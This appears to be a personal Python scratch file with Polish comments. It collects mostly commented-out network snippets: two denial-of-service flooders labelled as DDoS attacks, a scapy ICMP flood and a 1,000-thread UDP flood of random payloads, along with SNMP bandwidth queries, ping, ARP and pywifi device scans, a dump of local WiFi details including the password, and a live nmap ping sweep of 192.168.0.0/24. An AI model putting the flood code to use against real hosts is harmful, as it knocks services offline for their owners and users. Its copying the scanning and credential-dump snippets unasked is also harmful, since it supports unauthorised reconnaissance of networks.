# from scapy.all import *
# from scapy.layers.inet import IP, ICMP
#
#
# def ddos_attack(target_ip, num_packets):
#     # Tworzenie pakietu ICMP Echo Request
#     packet = IP(dst=target_ip) / ICMP()
#
#     # Wysyłanie pakietów
#     send(packet * num_packets)
#
# # Wywołanie funkcji do przeprowadzenia ataku DDoS
# ddos_attack("192.168.0.243", 100000)


# import socket
# import random
# import time
# import threading
#
# # Funkcja do wysyłania pakietów do określonego adresu IP
# def ddos(target_ip):
#     while True:
#         try:
#             # Tworzenie gniazda
#             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#             # Generowanie losowej zawartości pakietu
#             payload = random._urandom(1024)
#             # Wysyłanie pakietu na określony adres IP
#             s.sendto(payload, (target_ip, 80))
#             # Zamykanie gniazda
#             s.close()
#         except socket.error:
#             pass
#
# # Funkcja główna
# def main():
#     # Adres IP, który będzie celem ataku DDoS
#     target_ip = ""
#
#     # Tworzenie wielu wątków, które będą symulować atak
#     for _ in range(1000):
#         print("AA")
#         # Tworzenie wątku dla każdego atakującego
#         thread = threading.Thread(target=ddos, args=(target_ip,))
#         # Uruchamianie wątku
#         thread.start()
#
# main()

# from pysnmp.hlapi import *
#
# # Parametry SNMP
# router_ip = '192.168.0.1'
# community_string = 'nazwa_dla_community_string'
# snmp_port = 161
#
# # Oid dla obciążenia pasma
# oid = ObjectIdentity('IF-MIB', 'ifInOctets', 1)
# Przykładowe OID dla obciążenia pasma (zależne od konkretnego routera)
#
# # Funkcja do pobierania danych SNMP
# def get_snmp_data(ip, oid, community_string, port=161):
#     iterator = getCmd(
#         SnmpEngine(),
#         CommunityData(community_string),
#         UdpTransportTarget((ip, port)),
#         ContextData(),
#         ObjectType(ObjectIdentity(oid))
#     )
#     error_indication, error_status, error_index, var_binds = next(iterator)
#     if error_indication:
#         print(error_indication)
#     elif error_status:
#         print('%s at %s' % (
#             error_status.prettyPrint(),
#             error_index and var_binds[int(error_index) - 1][0] or '?'
#         ))
#     else:
#         for varBind in var_binds:
#             value = varBind[1]
#             print(value)
#
# # Pobranie danych o obciążeniu pasma
# get_snmp_data(router_ip, oid, community_string, snmp_port)


# import os
# import re
#
# def scan(ip_range):
#     ip_list = []
#     # Sprawdź pingując każdy adres IP w zakresie
#     for i in range(1, 256):
#         ip = ip_range[:-1] + str(i)
#         response = os.popen(f"ping -n 1 {ip}").read()
#         if "Reply from" in response:
#             # Jeśli otrzymujemy odpowiedź, odczytujemy adres MAC
#             mac_address = get_mac_address(ip)
#             ip_list.append({"ip": ip, "mac": mac_address})
#     return ip_list
#
# def get_mac_address(ip):
#     # Wykonujemy polecenie ARP dla danego adresu IP i odczytujemy adres MAC
#     arp_result = os.popen(f"arp -a {ip}").read()
#     mac_address_match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", arp_result)
#     if mac_address_match:
#         return mac_address_match.group(0)
#     else:
#         return "Unknown"
#
# def print_result(results_list):
#     print("IP Address\t\tMAC Address")
#     print("-----------------------------------------")
#     for client in results_list:
#         print(client["ip"] + "\t\t" + client["mac"])
#
# # Adres IP Twojej sieci, np. 192.168.1.
# ip_range = "192.168.0.0"
# scanned_devices = scan(ip_range)
# print_result(scanned_devices)

# from who_is_on_my_wifi import *
#
# dev = device()
#
# print(f"""
# PC Name:            {dev[0]}
# PC Product-Name:    {dev[1]}
# MAC Address:        {dev[2]}
# IP Address (host):  {dev[3]}
# IP Address:         {dev[4]}
# Public IP:          {dev[5]}
# PC HostName:        {dev[6]}
# WiFi Name:          {dev[7]}
# Gateway:            {dev[8]}
# DNS 1:              {dev[9]}
# DNS 2:              {dev[10]}
# Password:           {dev[11]}
# Security:           {dev[12]}
# Interface:          {dev[13]}
# Frequency:          {dev[14]}
# Signal:             {dev[15]}
# Channel:            {dev[16]}
#
#
# Country:            {dev[17]}
# Region:             {dev[18]}
# City:               {dev[19]}
# Zip Code:           {dev[20]}
# Latitude:           {dev[21]}
# Longitude:          {dev[22]}
# Map:                {dev[23]}
# ISP:                {dev[24]}
# """)

# import pywifi
# from pywifi import const
#
# def scan_wifi_devices():
#     wifi = pywifi.PyWiFi()
#     iface = wifi.interfaces()[0]
#     iface.scan()
#     results = iface.scan_results()
#     return results
#
# if __name__ == "__main__":
#     wifi_devices = scan_wifi_devices()
#     print("Urządzenia podłączone do sieci WiFi:")
#     for device in wifi_devices:
#         print(device.ssid, device.bssid)


# from scapy.all import *
#
# def get_wifi_interface():
#     for interface in get_if_list():
#         print(interface)
#         if 'wlan' in interface:
#             return '5EBF94BC-4DE8-495C-902B-92FD8B687ED1'
#     return '5EBF94BC-4DE8-495C-902B-92FD8B687ED1'
#
# def arp_scan(interface):
#     ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.0.0/24"), timeout=2, iface=interface, verbose=False)
#     devices = set()
#     for _, received in ans:
#         devices.add(received.psrc)
#     return devices
#
# if __name__ == "__main__":
#     wifi_interface = get_wifi_interface()
#     if wifi_interface:
#         print("Znaleziono interfejs WiFi:", wifi_interface)
#         print("Skanowanie...")
#         devices = arp_scan(wifi_interface)
#         if devices:
#             print("Urządzenia podłączone do tej samej sieci WiFi:")
#             for device in devices:
#                 print("IP:", device)
#         else:
#             print("Nie znaleziono urządzeń podłączonych do tej samej sieci WiFi.")
#     else:
#         print("Nie znaleziono interfejsu WiFi.")
#


# import time
# from pywifi import PyWiFi, const
#
#
# def scan_wifi_networks():
#     # Tworzymy obiekt do zarządzania WiFi
#     wifi = PyWiFi()
#
#     # Pobieramy interfejs WiFi
#     iface = wifi.interfaces()[0]  # zakładamy, że jest tylko jeden interfejs
#
#     # Włączamy interfejs WiFi
#     iface.scan()
#
#     # Oczekujemy chwilę na wyniki skanowania
#     time.sleep(5)
#
#     # Pobieramy listę dostępnych sieci
#     network_list = iface.scan_results()
#
#     # Wyświetlamy informacje o dostępnych sieciach
#     print("Dostępne sieci WiFi:")
#     for network in network_list:
#         print("SSID:", network.ssid, "BSSID:", network.bssid, "Signal:", network.signal)
#
#
# # Uruchamiamy funkcję skanującą
# scan_wifi_networks()


import nmap


def scan_wifi_networks():
    # Tworzymy obiekt skanera sieci
    scanner = nmap.PortScanner()

    # Skanujemy sieć w poszukiwaniu urządzeń
    scanner.scan(hosts='192.168.0.0/24', arguments='-sn')

    # Wyświetlamy znalezione urządzenia i ich adresy IP
    for host in scanner.all_hosts():
        if 'mac' in scanner[host]['addresses']:
            print("MAC:", scanner[host]['addresses']['mac'], "IP:", host)


# Uruchamiamy funkcję skanującą
scan_wifi_networks()
